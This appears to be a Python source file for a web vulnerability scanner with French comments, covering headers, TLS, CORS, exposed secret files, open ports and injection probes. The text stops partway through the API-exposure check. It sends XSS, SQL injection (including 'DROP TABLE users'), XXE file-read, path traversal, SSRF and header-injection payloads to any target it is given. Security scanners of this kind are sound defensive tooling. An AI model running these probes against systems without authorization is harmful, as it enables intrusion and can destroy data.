"""
VulnGuard AI — Scanner de vulnérabilités complet
Couvre : OWASP Top 10 + headers + SSL + cookies + injections + exposed files + admin panels + ...
"""

import requests
import re
import socket
import ssl
import json
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse, urlencode, quote
from bs4 import BeautifulSoup
import logging

logger = logging.getLogger(__name__)


class VulnerabilityScanner:

    def __init__(self, target_url: str, db=None):
        self.target_url = target_url.rstrip("/")
        self.db = db

        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (VulnGuardAI/4.0)"})
        self.session.verify = False  # permet de scanner les certs invalides
        requests.packages.urllib3.disable_warnings()

        self.timeout = 10
        self.vulnerabilities = []
        self.visited_urls = set()
        self.found_forms = []
        self._csrf_reported = set()
        self._xss_reported = set()
        self._sqli_reported = set()

    # =========================================================
    # MAIN
    # =========================================================

    def scan(self):
        logger.info(f"Scan démarré : {self.target_url}")

        self.crawl_website(self.target_url)

        # Sécurité réseau
        self.check_headers()
        self.check_ssl()
        self.check_cors()
        self.check_open_ports()
        self.check_http_methods()
        self.check_http_to_https_redirect()

        # Fuites d'informations
        self.check_sensitive_files()
        self.check_backup_files()
        self.check_exposed_admin_panels()
        self.check_directory_listing()
        self.check_robots_sitemap()
        self.check_information_disclosure()
        self.check_error_pages()
        self.detect_technologies()
        self.check_source_comments()

        # Cookies & sessions
        self.check_cookies()

        # Injections
        self.scan_forms()
        self.check_open_redirect()
        self.check_ssti()
        self.check_ssrf()
        self.check_xxe()
        self.check_path_traversal()
        self.check_header_injection()

        # Contrôle d'accès
        self.check_cors_bypass()
        self.check_mixed_content()
        self.check_subresource_integrity()
        self.check_rate_limiting()
        self.check_api_exposure()

        # Injections avancées
        self.check_sqli_blind()
        self.check_nosql_injection()
        self.check_command_injection()

        # Authentification & sessions
        self.check_default_credentials()
        self.check_jwt_weaknesses()

        # Upload & fichiers
        self.check_file_upload()

        # Clickjacking réel
        self.check_clickjacking()

        # Subdomains & DNS
        self.check_subdomain_takeover()

        # HTTP avancé
        self.check_http_smuggling()
        self.check_cache_poisoning()
        self.check_http_parameter_pollution()

        # Fingerprinting avancé
        self.check_waf_detection()
        self.check_cdn_headers()

        score = self.calculate_security_score()
        logger.info(f"Scan terminé : {len(self.vulnerabilities)} vulnérabilités")

        return {
            "vulnerabilities": self.vulnerabilities,
            "security_score": score,
            "summary": self.get_summary(),
        }

    # =========================================================
    # HELPERS
    # =========================================================

    def add_vulnerability(self, title, description, severity, cvss_score, remediation, endpoint=None):
        self.vulnerabilities.append({
            "title": title,
            "description": description,
            "severity": severity,
            "cvss_score": str(cvss_score),
            "endpoint": endpoint or self.target_url,
            "remediation": remediation,
            "status": "open",
        })
        logger.warning(f"[{severity.upper()}] {title}")

    def _get(self, url, **kwargs):
        try:
            return self.session.get(url, timeout=self.timeout, allow_redirects=True, **kwargs)
        except Exception:
            return None

    def _post(self, url, **kwargs):
        try:
            return self.session.post(url, timeout=self.timeout, **kwargs)
        except Exception:
            return None

    # =========================================================
    # CRAWL
    # =========================================================

    def crawl_website(self, url, depth=2):
        if depth <= 0 or url in self.visited_urls:
            return
        self.visited_urls.add(url)
        try:
            r = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(r.text, "html.parser")
            for form in soup.find_all("form"):
                self.found_forms.append({"url": url, "form": form})
            for link in soup.find_all("a", href=True):
                full = urljoin(url, link["href"])
                if self.target_url in full:
                    self.crawl_website(full, depth - 1)
        except Exception:
            pass

    # =========================================================
    # 1. SECURITY HEADERS
    # =========================================================

    def check_headers(self):
        r = self._get(self.target_url)
        if not r:
            return
        h = r.headers

        checks = [
            ("Strict-Transport-Security",  "Missing HSTS Header",
             "HSTS absent — les navigateurs peuvent se connecter en HTTP non chiffré.",
             "medium", 5.4,
             "Ajouter : Strict-Transport-Security: max-age=31536000; includeSubDomains"),

            ("Content-Security-Policy",    "Missing Content-Security-Policy",
             "Sans CSP, les attaques XSS et injection de contenu sont facilitées.",
             "medium", 6.1,
             "Définir une politique CSP stricte, ex: default-src 'self'"),

            ("X-Frame-Options",            "Missing X-Frame-Options",
             "La page peut être intégrée dans une iframe (Clickjacking).",
             "medium", 5.4,
             "Ajouter : X-Frame-Options: DENY ou SAMEORIGIN"),

            ("X-Content-Type-Options",     "Missing X-Content-Type-Options",
             "Le navigateur peut deviner le Content-Type (MIME sniffing).",
             "low",    3.7,
             "Ajouter : X-Content-Type-Options: nosniff"),

            ("Referrer-Policy",            "Missing Referrer-Policy",
             "Les URLs de référence peuvent être envoyées à des tiers.",
             "medium", 5.0,
             "Ajouter : Referrer-Policy: strict-origin-when-cross-origin"),

            ("Permissions-Policy",         "Missing Permissions-Policy",
             "Les permissions navigateur (caméra, micro, géolocalisation) ne sont pas restreintes.",
             "low",    3.5,
             "Ajouter : Permissions-Policy: geolocation=(), camera=(), microphone=()"),

            ("X-XSS-Protection",           "Missing X-XSS-Protection",
             "Le filtre XSS du navigateur n'est pas activé (navigateurs legacy).",
             "low",    3.0,
             "Ajouter : X-XSS-Protection: 1; mode=block"),
        ]

        for header, title, desc, sev, cvss, rem in checks:
            if header not in h:
                self.add_vulnerability(title, desc, sev, cvss, rem)

        # Cache-Control sur pages sensibles
        cc = h.get("Cache-Control", "")
        if "no-store" not in cc and "private" not in cc:
            self.add_vulnerability(
                "Weak Cache-Control Policy",
                "Les réponses peuvent être mises en cache par des proxies intermédiaires.",
                "low", 3.1,
                "Ajouter : Cache-Control: no-store, private pour les pages sensibles"
            )

    # =========================================================
    # 2. SSL / TLS
    # =========================================================

    def check_ssl(self):
        parsed = urlparse(self.target_url)
        if parsed.scheme != "https":
            self.add_vulnerability(
                "Site non sécurisé (HTTP)",
                "Le site utilise HTTP en clair — toutes les communications sont interceptables.",
                "critical", 9.5,
                "Activer HTTPS avec un certificat TLS valide"
            )
            return

        hostname = parsed.hostname
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    proto = ssock.version()

                    if not cert:
                        self.add_vulnerability(
                            "Certificat SSL invalide",
                            "Le certificat SSL est absent ou invalide.",
                            "high", 7.5,
                            "Installer un certificat TLS valide (Let's Encrypt, etc.)"
                        )

                    if proto in ("TLSv1", "TLSv1.1", "SSLv3", "SSLv2"):
                        self.add_vulnerability(
                            "Protocole TLS obsolète",
                            f"Le serveur utilise {proto} qui présente des vulnérabilités connues (POODLE, BEAST).",
                            "high", 7.4,
                            "Désactiver TLS 1.0 et TLS 1.1 — utiliser TLS 1.2+ uniquement"
                        )
        except ssl.SSLCertVerificationError:
            self.add_vulnerability(
                "Certificat SSL non approuvé",
                "Le certificat SSL n'est pas signé par une autorité de confiance.",
                "high", 7.4,
                "Utiliser un certificat émis par une CA reconnue"
            )
        except ssl.CertificateError:
            self.add_vulnerability(
                "Certificat SSL — Nom de domaine invalide",
                "Le certificat ne correspond pas au nom de domaine du serveur.",
                "high", 7.4,
                "Générer un certificat pour le bon nom de domaine"
            )
        except Exception:
            pass

    # =========================================================
    # 3. CORS
    # =========================================================

    def check_cors(self):
        r = self._get(self.target_url, headers={"Origin": "https://evil-attacker.com"})
        if not r:
            return
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")

        if acao == "*":
            self.add_vulnerability(
                "CORS Wildcard (Open CORS)",
                "Le serveur accepte les requêtes cross-origin de n'importe quel domaine.",
                "high", 7.4,
                "Restreindre Access-Control-Allow-Origin aux domaines autorisés"
            )
        elif "evil-attacker.com" in acao and acac.lower() == "true":
            self.add_vulnerability(
                "CORS — Origine arbitraire avec credentials",
                "Le serveur reflète l'origine de l'attaquant ET autorise les cookies — vol de session possible.",
                "critical", 9.0,
                "Ne jamais combiner Allow-Credentials: true avec des origines dynamiques non vérifiées"
            )

    def check_cors_bypass(self):
        bypass_origins = [
            "https://evil.com",
            "null",
            f"https://attacker.{urlparse(self.target_url).hostname}",
        ]
        for origin in bypass_origins:
            r = self._get(self.target_url, headers={"Origin": origin})
            if r and r.headers.get("Access-Control-Allow-Origin") == origin:
                self.add_vulnerability(
                    "CORS Bypass — Origine reflétée",
                    f"Le serveur reflète l'origine '{origin}' sans validation — CORS bypass possible.",
                    "high", 7.5,
                    "Valider l'origine contre une liste blanche stricte"
                )
                return

    # =========================================================
    # 4. FICHIERS SENSIBLES
    # =========================================================

    def check_sensitive_files(self):
        targets = {
            "/.env":              ["APP_KEY", "SECRET_KEY", "DB_PASSWORD", "DATABASE_URL", "AWS_"],
            "/.env.local":        ["APP_KEY", "SECRET"],
            "/.env.production":   ["SECRET", "PASSWORD"],
            "/.git/config":       ["[core]", "repositoryformatversion"],
            "/.git/HEAD":         ["ref: refs/"],
            "/database.sql":      ["CREATE TABLE", "INSERT INTO"],
            "/db.sql":            ["CREATE TABLE"],
            "/dump.sql":          ["CREATE TABLE"],
            "/config.php":        ["DB_HOST", "<?php"],
            "/wp-config.php":     ["DB_NAME", "DB_PASSWORD"],
            "/phpinfo.php":       ["phpinfo", "PHP Version"],
            "/server-status":     ["Apache Server Status", "requests currently being processed"],
            "/server-info":       ["Apache Server Information"],
            "/.htpasswd":         [":"],
            "/web.config":        ["connectionString", "<configuration>"],
            "/package.json":      ['"dependencies"', '"scripts"'],
            "/composer.json":     ['"require"'],
            "/.DS_Store":         [],
            "/Thumbs.db":         [],
            "/.bash_history":     ["sudo", "mysql", "ssh"],
            "/id_rsa":            ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY"],
            "/credentials":       ["aws_access_key"],
            "/.aws/credentials":  ["aws_access_key"],
        }

        for path, indicators in targets.items():
            url = self.target_url + path
            r = self._get(url)
            if not r or r.status_code != 200:
                continue
            content = r.text[:3000].lower()
            if "404" in content and "not found" in content:
                continue
            if not indicators or any(i.lower() in content for i in indicators):
                self.add_vulnerability(
                    "Fichier sensible exposé",
                    f"Le fichier '{path}' est accessible publiquement et peut contenir des informations critiques.",
                    "critical", 9.1,
                    f"Bloquer l'accès à '{path}' via .htaccess ou configuration serveur",
                    endpoint=url
                )

    def check_backup_files(self):
        parsed = urlparse(self.target_url)
        domain = parsed.hostname.replace(".", "_")
        paths = [
            "/backup.zip", "/backup.tar.gz", "/backup.sql",
            f"/{domain}.zip", f"/{domain}.sql",
            "/site.zip", "/www.zip", "/old.zip",
            "/backup/", "/backups/", "/bkp/",
            "/archive.zip", "/data.zip",
        ]
        for path in paths:
            url = self.target_url + path
            r = self._get(url)
            if r and r.status_code == 200:
                ct = r.headers.get("Content-Type", "")
                if any(x in ct for x in ["zip", "octet-stream", "sql", "gzip", "tar"]) or len(r.content) > 1000:
                    self.add_vulnerability(
                        "Fichier de backup exposé",
                        f"Un fichier de sauvegarde est accessible : '{path}'",
                        "critical", 9.1,
                        "Supprimer les backups du répertoire public ou restreindre l'accès",
                        endpoint=url
                    )

    # =========================================================
    # 5. PANNEAU ADMIN EXPOSÉ
    # =========================================================

    def check_exposed_admin_panels(self):
        admin_paths = [
            "/admin", "/admin/", "/admin/login", "/admin/index.php",
            "/wp-admin", "/wp-admin/", "/wp-login.php",
            "/administrator", "/administrator/",
            "/panel", "/cpanel", "/phpmyadmin", "/pma",
            "/dashboard", "/manager", "/control",
            "/backend", "/backoffice", "/secure",
            "/login", "/signin", "/auth/login",
            "/console", "/shell", "/terminal",
            "/.well-known/admin",
        ]
        for path in admin_paths:
            url = self.target_url + path
            r = self._get(url)
            if r and r.status_code in (200, 401, 403):
                content = r.text[:2000].lower()
                if any(kw in content for kw in ["login", "password", "username", "admin", "dashboard", "sign in"]):
                    self.add_vulnerability(
                        "Panneau d'administration exposé",
                        f"Une interface d'administration est accessible à : '{path}'",
                        "high", 7.5,
                        "Restreindre l'accès aux panneaux d'administration par IP ou VPN",
                        endpoint=url
                    )
                    return

    # =========================================================
    # 6. DIRECTORY LISTING
    # =========================================================

    def check_directory_listing(self):
        dirs = ["/uploads/", "/images/", "/files/", "/static/", "/assets/", "/backup/", "/logs/"]
        for path in dirs:
            url = self.target_url + path
            r = self._get(url)
            if r and r.status_code == 200:
                content = r.text[:2000].lower()
                if "index of" in content or "parent directory" in content:
                    self.add_vulnerability(
                        "Directory Listing activé",
                        f"Le listing du répertoire est activé sur '{path}' — les fichiers sont listés publiquement.",
                        "medium", 5.3,
                        "Désactiver Options Indexes dans Apache ou autoindex off dans Nginx",
                        endpoint=url
                    )

    # =========================================================
    # 7. ROBOTS.TXT / SITEMAP
    # =========================================================

    def check_robots_sitemap(self):
        for path in ["/robots.txt", "/sitemap.xml"]:
            url = self.target_url + path
            r = self._get(url)
            if r and r.status_code == 200:
                content = r.text[:3000]
                hidden_paths = re.findall(r"Disallow:\s*(/[^\s]+)", content)
                sensitive = [p for p in hidden_paths if any(
                    kw in p.lower() for kw in ["admin", "login", "private", "secret", "backup", "config", "test"]
                )]
                if sensitive:
                    self.add_vulnerability(
                        "Chemins sensibles dans robots.txt",
                        f"robots.txt révèle des chemins sensibles : {', '.join(sensitive[:5])}",
                        "low", 3.5,
                        "Ne pas lister les chemins sensibles dans robots.txt",
                        endpoint=url
                    )

    # =========================================================
    # 8. INFORMATION DISCLOSURE
    # =========================================================

    def check_information_disclosure(self):
        r = self._get(self.target_url)
        if not r:
            return
        content = r.text[:10000]

        patterns = [
            (r"(?i)(api[_\-]?key|apikey)\s*[:=]\s*['\"]?[A-Za-z0-9\-_]{20,}", "Clé API exposée", "critical", 9.0),
            (r"(?i)(secret[_\-]?key|secret)\s*[:=]\s*['\"]?[A-Za-z0-9\-_]{16,}", "Secret Key exposé", "critical", 9.0),
            (r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"]?[^\s\"']{6,}", "Mot de passe exposé", "critical", 9.8),
            (r"AKIA[0-9A-Z]{16}", "Clé AWS Access Key exposée", "critical", 9.8),
            (r"(?i)aws_secret_access_key\s*[:=]\s*[A-Za-z0-9/+=]{40}", "AWS Secret Key exposée", "critical", 9.8),
            (r"(?i)(token|access_token|auth_token)\s*[:=]\s*['\"]?[A-Za-z0-9\-_.]{20,}", "Token d'authentification exposé", "high", 8.0),
            (r"(?i)private[_\-]?key", "Clé privée potentiellement exposée", "high", 7.5),
            (r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----", "Clé privée RSA/EC exposée", "critical", 9.9),
            (r"(?i)(mysql|postgres|mongodb|redis):\/\/[^\s\"'<>]+", "Chaîne de connexion base de données exposée", "critical", 9.5),
            (r"(?i)stack trace|traceback|exception in thread|at [a-zA-Z]+\.[a-zA-Z]+\(", "Stack trace exposé", "medium", 5.3),
            (r"(?i)sql syntax|mysql_fetch|ORA-[0-9]+|pg_query|sqlite_query", "Erreur SQL exposée", "high", 7.5),
            (r"(?i)(internal server error|debug mode|werkzeug debugger)", "Mode debug activé", "high", 7.0),
        ]

        for pattern, title, sev, cvss in patterns:
            if re.search(pattern, content):
                self.add_vulnerability(
                    title,
                    f"Le pattern '{pattern[:50]}' a été détecté dans le code source de la page.",
                    sev, cvss,
                    "Supprimer toutes les informations sensibles du code côté client"
                )

    def check_source_comments(self):
        r = self._get(self.target_url)
        if not r:
            return
        comments = re.findall(r"<!--(.*?)-->", r.text, re.DOTALL)
        for c in comments:
            if any(kw in c.lower() for kw in ["todo", "fixme", "hack", "password", "secret", "admin", "key", "token", "debug"]):
                self.add_vulnerability(
                    "Commentaires HTML sensibles",
                    f"Des commentaires HTML révèlent des informations internes : '{c[:100].strip()}'",
                    "low", 3.5,
                    "Supprimer les commentaires contenant des informations sensibles avant la mise en production"
                )
                return

    def check_error_pages(self):
        for path in ["/this-page-does-not-exist-404test", "/../../etc/passwd"]:
            url = self.target_url + path
            r = self._get(url)
            if r and r.status_code in (404, 500):
                content = r.text[:2000].lower()
                if any(kw in content for kw in [
                    "apache", "nginx", "iis", "php", "python", "django", "flask",
                    "stack trace", "exception", "traceback", "line ", "file "
                ]):
                    self.add_vulnerability(
                        "Pages d'erreur révèlent la technologie",
                        "Les pages d'erreur exposent des informations sur la stack technique (version serveur, framework...).",
                        "low", 3.5,
                        "Configurer des pages d'erreur personnalisées sans information technique"
                    )
                    return

    # =========================================================
    # 9. TECHNOLOGY DISCLOSURE
    # =========================================================

    def detect_technologies(self):
        r = self._get(self.target_url)
        if not r:
            return
        h = r.headers
        server = h.get("Server", "")
        powered = h.get("X-Powered-By", "")
        aspnet = h.get("X-AspNet-Version", "")
        generator = re.search(r'<meta name="generator" content="([^"]+)"', r.text, re.I)

        if server:
            self.add_vulnerability(
                "Server Header — Version Disclosure",
                f"Le header Server révèle : '{server}'. Un attaquant peut cibler les CVEs spécifiques à cette version.",
                "low", 3.2,
                "Masquer la version du serveur dans la configuration Apache/Nginx"
            )
        if powered:
            self.add_vulnerability(
                "X-Powered-By — Technology Disclosure",
                f"Le header X-Powered-By révèle : '{powered}'",
                "low", 3.0,
                "Supprimer le header X-Powered-By"
            )
        if aspnet:
            self.add_vulnerability(
                "X-AspNet-Version — Version Disclosure",
                f"La version ASP.NET est exposée : '{aspnet}'",
                "low", 3.0,
                "Désactiver ce header dans web.config : <httpRuntime enableVersionHeader='false'/>"
            )
        if generator:
            self.add_vulnerability(
                "CMS / Generator exposé",
                f"La balise meta generator révèle : '{generator.group(1)}'",
                "info", 2.5,
                "Supprimer la balise meta generator"
            )

    # =========================================================
    # 10. COOKIES
    # =========================================================

    def check_cookies(self):
        r = self._get(self.target_url)
        if not r:
            return
        for cookie in r.cookies:
            name = cookie.name
            issues = []
            if not cookie.secure:
                issues.append("flag Secure absent — cookie transmissible en HTTP")
            if not cookie.has_nonstandard_attr("HttpOnly"):
                issues.append("flag HttpOnly absent — accessible via JavaScript (XSS)")
            samesite = cookie.get_nonstandard_attr("SameSite") or ""
            if not samesite or samesite.lower() == "none":
                issues.append("flag SameSite absent ou None — vulnérable au CSRF")
            if issues:
                self.add_vulnerability(
                    f"Cookie non sécurisé : {name}",
                    f"Le cookie '{name}' a les problèmes suivants : {'; '.join(issues)}",
                    "medium", 5.4,
                    "Définir les flags Secure, HttpOnly et SameSite=Strict sur tous les cookies de session"
                )

    # =========================================================
    # 11. HTTP METHODS
    # =========================================================

    def check_http_methods(self):
        dangerous = ["PUT", "DELETE", "TRACE", "CONNECT", "PATCH"]
        for method in dangerous:
            try:
                r = self.session.request(method, self.target_url, timeout=self.timeout)
                if r.status_code not in (405, 501, 403):
                    self.add_vulnerability(
                        f"Méthode HTTP dangereuse activée : {method}",
                        f"Le serveur accepte la méthode {method} (status {r.status_code}) — peut permettre modifications non autorisées.",
                        "medium", 5.8,
                        f"Désactiver la méthode HTTP {method} si non requise"
                    )
            except Exception:
                pass

        # TRACE — Cross-Site Tracing (XST)
        try:
            r = self.session.request("TRACE", self.target_url, timeout=self.timeout)
            if r.status_code == 200 and "TRACE" in r.text:
                self.add_vulnerability(
                    "Cross-Site Tracing (XST) — TRACE activé",
                    "La méthode HTTP TRACE est activée et reflète les headers — peut contourner HttpOnly.",
                    "medium", 5.8,
                    "Désactiver la méthode TRACE sur le serveur"
                )
        except Exception:
            pass

    # =========================================================
    # 12. HTTP → HTTPS REDIRECT
    # =========================================================

    def check_http_to_https_redirect(self):
        parsed = urlparse(self.target_url)
        if parsed.scheme == "https":
            http_url = self.target_url.replace("https://", "http://", 1)
            try:
                r = requests.get(http_url, timeout=8, allow_redirects=False, verify=False)
                if r.status_code not in (301, 302, 307, 308):
                    self.add_vulnerability(
                        "Pas de redirection HTTP → HTTPS",
                        "Le serveur ne redirige pas automatiquement le trafic HTTP vers HTTPS.",
                        "medium", 5.9,
                        "Configurer une redirection permanente 301 de HTTP vers HTTPS"
                    )
            except Exception:
                pass

    # =========================================================
    # 13. OPEN PORTS
    # =========================================================

    def check_open_ports(self):
        host = urlparse(self.target_url).hostname
        risky_ports = {
            21:   ("FTP", "high",   7.5),
            22:   ("SSH", "medium", 5.5),
            23:   ("Telnet (non chiffré)", "critical", 9.8),
            25:   ("SMTP", "medium", 5.5),
            110:  ("POP3", "medium", 5.5),
            143:  ("IMAP", "medium", 5.5),
            3306: ("MySQL", "high",   8.0),
            5432: ("PostgreSQL", "high", 8.0),
            6379: ("Redis (sans auth)", "critical", 9.8),
            27017:("MongoDB (sans auth)", "critical", 9.8),
            8080: ("HTTP alternatif", "low", 3.5),
            8443: ("HTTPS alternatif", "low", 3.5),
            9200: ("Elasticsearch", "critical", 9.8),
            9300: ("Elasticsearch cluster", "high", 8.0),
        }

        def scan_port(item):
            port, (service, sev, cvss) = item
            try:
                sock = socket.socket()
                sock.settimeout(1.5)
                if sock.connect_ex((host, port)) == 0:
                    self.add_vulnerability(
                        f"Port {port} ouvert ({service})",
                        f"Le port {port} ({service}) est accessible publiquement depuis Internet.",
                        sev, cvss,
                        f"Fermer le port {port} ou le restreindre par firewall"
                    )
                sock.close()
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=15) as ex:
            ex.map(scan_port, risky_ports.items())

    # =========================================================
    # 14. FORMULAIRES — CSRF / XSS / SQLi
    # =========================================================

    def scan_forms(self):
        for item in self.found_forms:
            form = item["form"]
            url = item["url"]
            self._check_csrf(form, url)
            for inp in form.find_all("input"):
                name = inp.get("name", "")
                if not name:
                    continue
                self._test_xss(url, name)
                self._test_sqli(url, name)

    def _check_csrf(self, form, url):
        if url in self._csrf_reported:
            return
        html = str(form).lower()
        method = form.get("method", "get").lower()
        if method == "post" and not any(
            kw in html for kw in ["csrf", "_token", "authenticity_token", "nonce"]
        ):
            self._csrf_reported.add(url)
            self.add_vulnerability(
                "Cross-Site Request Forgery (CSRF)",
                "Formulaire POST sans token CSRF — un attaquant peut forger des requêtes au nom d'un utilisateur connecté.",
                "high", 7.5,
                "Implémenter des tokens CSRF synchronisés sur tous les formulaires POST",
                endpoint=url
            )

    def _test_xss(self, url, param):
        if url in self._xss_reported:
            return
        payloads = [
            "<script>alert(1)</script>",
            '"><img src=x onerror=alert(1)>',
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
        ]
        for payload in payloads:
            r = self._get(url, params={param: payload})
            if r and payload in r.text:
                self._xss_reported.add(url)
                self.add_vulnerability(
                    "Cross-Site Scripting (XSS) Réfléchi",
                    f"Le paramètre '{param}' reflète du contenu non échappé — injection de script possible.",
                    "critical", 8.5,
                    "Encoder toutes les sorties utilisateur (htmlspecialchars, DOMPurify)",
                    endpoint=f"{url}?{param}={quote(payload)}"
                )
                return

    def _test_sqli(self, url, param):
        if url in self._sqli_reported:
            return
        payloads = ["'", "''", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--", "1; DROP TABLE users--"]
        errors = ["sql syntax", "mysql_fetch", "pg_query", "sqlite", "ORA-", "syntax error",
                  "unclosed quotation", "unterminated string", "division by zero", "sqlstate"]
        for payload in payloads:
            r = self._get(url, params={param: payload})
            if r and any(e in r.text.lower() for e in errors):
                self._sqli_reported.add(url)
                self.add_vulnerability(
                    "SQL Injection",
                    f"Le paramètre '{param}' est vulnérable à l'injection SQL — extraction de données possible.",
                    "critical", 9.8,
                    "Utiliser des requêtes préparées (parameterized queries) et un ORM",
                    endpoint=f"{url}?{param}={quote(payload)}"
                )
                return

    # =========================================================
    # 15. OPEN REDIRECT
    # =========================================================

    def check_open_redirect(self):
        redirect_params = ["url", "redirect", "redirect_uri", "next", "return", "returnUrl",
                           "goto", "dest", "destination", "rurl", "target", "out"]
        evil_url = "https://evil-redirect-test.com"
        for param in redirect_params:
            test_url = f"{self.target_url}?{param}={evil_url}"
            try:
                r = requests.get(test_url, timeout=8, allow_redirects=False, verify=False)
                loc = r.headers.get("Location", "")
                if "evil-redirect-test.com" in loc:
                    self.add_vulnerability(
                        "Open Redirect",
                        f"Le paramètre '{param}' permet une redirection vers n'importe quel domaine — phishing facilité.",
                        "medium", 6.1,
                        "Valider les redirections contre une liste blanche d'URLs autorisées",
                        endpoint=test_url
                    )
                    return
            except Exception:
                pass

    # =========================================================
    # 16. SERVER-SIDE TEMPLATE INJECTION (SSTI)
    # =========================================================

    def check_ssti(self):
        payloads = {
            "{{7*7}}": "49",
            "${7*7}": "49",
            "#{7*7}": "49",
            "<%= 7*7 %>": "49",
        }
        test_params = ["q", "search", "query", "name", "input", "msg", "template"]
        for param in test_params:
            for payload, expected in payloads.items():
                r = self._get(self.target_url, params={param: payload})
                if r and expected in r.text:
                    self.add_vulnerability(
                        "Server-Side Template Injection (SSTI)",
                        f"Le paramètre '{param}' est vulnérable au SSTI — exécution de code serveur possible.",
                        "critical", 9.8,
                        "Ne jamais passer des entrées utilisateur directement dans un moteur de templates",
                        endpoint=f"{self.target_url}?{param}={quote(payload)}"
                    )
                    return

    # =========================================================
    # 17. SSRF
    # =========================================================

    def check_ssrf(self):
        ssrf_params = ["url", "uri", "src", "source", "fetch", "load", "path",
                       "file", "resource", "api", "webhook", "callback"]
        # On teste avec une adresse interne caractéristique
        internal_urls = ["http://localhost/", "http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/"]
        for param in ssrf_params:
            for internal in internal_urls[:1]:
                r = self._get(self.target_url, params={param: internal})
                if r and r.status_code == 200 and len(r.text) > 0:
                    # Vérifier si la réponse contient des données internes typiques
                    if any(kw in r.text.lower() for kw in
                           ["ami-id", "instance-id", "root:x:", "localhost", "127.0.0.1"]):
                        self.add_vulnerability(
                            "Server-Side Request Forgery (SSRF)",
                            f"Le paramètre '{param}' permet au serveur de faire des requêtes internes.",
                            "critical", 9.0,
                            "Valider et filtrer toutes les URLs fournies par l'utilisateur. Bloquer les adresses RFC1918.",
                            endpoint=f"{self.target_url}?{param}={quote(internal)}"
                        )
                        return

    # =========================================================
    # 18. XXE
    # =========================================================

    def check_xxe(self):
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""
        headers = {"Content-Type": "application/xml"}
        r = self._post(self.target_url, data=xxe_payload, headers=headers)
        if r and ("root:x:" in r.text or "nobody:x:" in r.text):
            self.add_vulnerability(
                "XML External Entity (XXE) Injection",
                "Le serveur traite des entités XML externes — lecture de fichiers internes possible.",
                "critical", 9.0,
                "Désactiver le traitement des entités externes dans le parser XML (FEATURE_EXTERNAL_ENTITIES = False)"
            )

    # =========================================================
    # 19. PATH TRAVERSAL
    # =========================================================

    def check_path_traversal(self):
        traversal_params = ["file", "path", "filename", "doc", "document", "page", "template", "view"]
        payloads = [
            "../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
        ]
        for param in traversal_params:
            for payload in payloads:
                r = self._get(self.target_url, params={param: payload})
                if r and "root:x:" in r.text:
                    self.add_vulnerability(
                        "Path Traversal (LFI)",
                        f"Le paramètre '{param}' permet de lire des fichiers arbitraires du serveur.",
                        "critical", 9.1,
                        "Valider et normaliser tous les chemins de fichiers. N'utiliser que des chemins absolus prédéfinis.",
                        endpoint=f"{self.target_url}?{param}={payload}"
                    )
                    return

    # =========================================================
    # 20. HEADER INJECTION
    # =========================================================

    def check_header_injection(self):
        payload = "test\r\nX-Injected: hacked"
        test_params = ["redirect", "url", "next", "return"]
        for param in test_params:
            r = self._get(self.target_url, params={param: payload})
            if r and "X-Injected" in r.headers:
                self.add_vulnerability(
                    "HTTP Header Injection",
                    f"Le paramètre '{param}' permet l'injection de headers HTTP.",
                    "high", 7.2,
                    "Filtrer les caractères CRLF (\\r\\n) dans tous les paramètres utilisés dans les headers",
                    endpoint=f"{self.target_url}?{param}={quote(payload)}"
                )
                return

    # =========================================================
    # 21. MIXED CONTENT
    # =========================================================

    def check_mixed_content(self):
        if "https" not in self.target_url:
            return
        r = self._get(self.target_url)
        if not r:
            return
        http_resources = re.findall(r'(src|href|action)\s*=\s*["\']http://[^"\']+', r.text, re.I)
        if http_resources:
            self.add_vulnerability(
                "Mixed Content (HTTP dans HTTPS)",
                f"{len(http_resources)} ressource(s) chargée(s) en HTTP sur une page HTTPS — interception possible.",
                "medium", 5.4,
                "Remplacer toutes les URLs http:// par https:// dans les ressources de la page"
            )

    # =========================================================
    # 22. SUBRESOURCE INTEGRITY
    # =========================================================

    def check_subresource_integrity(self):
        r = self._get(self.target_url)
        if not r:
            return
        soup = BeautifulSoup(r.text, "html.parser")
        external_scripts = [
            s for s in soup.find_all("script", src=True)
            if s.get("src", "").startswith("http") and urlparse(self.target_url).hostname not in s["src"]
        ]
        missing_sri = [s for s in external_scripts if not s.get("integrity")]
        if missing_sri:
            self.add_vulnerability(
                "Subresource Integrity (SRI) absent",
                f"{len(missing_sri)} script(s) externe(s) sans attribut integrity — supply chain attack possible.",
                "medium", 6.1,
                "Ajouter l'attribut integrity (SHA-256/384) et crossorigin='anonymous' sur les scripts externes"
            )

    # =========================================================
    # 23. RATE LIMITING
    # =========================================================

    def check_rate_limiting(self):
        login_paths = ["/login", "/signin", "/auth/login", "/api/login", "/api/auth", "/wp-login.php"]
        for path in login_paths:
            url = self.target_url + path
            r = self._get(url)
            if not r or r.status_code not in (200, 401, 403):
                continue
            responses = []
            for _ in range(5):
                resp = self._post(url, data={"username": "admin", "password": "wrongpass123!"})
                if resp:
                    responses.append(resp.status_code)
            if responses and all(s not in (429, 403) for s in responses):
                self.add_vulnerability(
                    "Absence de Rate Limiting — Brute Force",
                    f"Aucune limitation de requêtes détectée sur '{path}' — attaque brute force possible.",
                    "high", 7.5,
                    "Implémenter un rate limiting (ex: 5 tentatives / 15 min) et un verrouillage de compte",
                    endpoint=url
                )
                return

    # =========================================================
    # 24. API ENDPOINTS EXPOSURE
    # =========================================================

    def check_api_exposure(self):
        api_paths = [
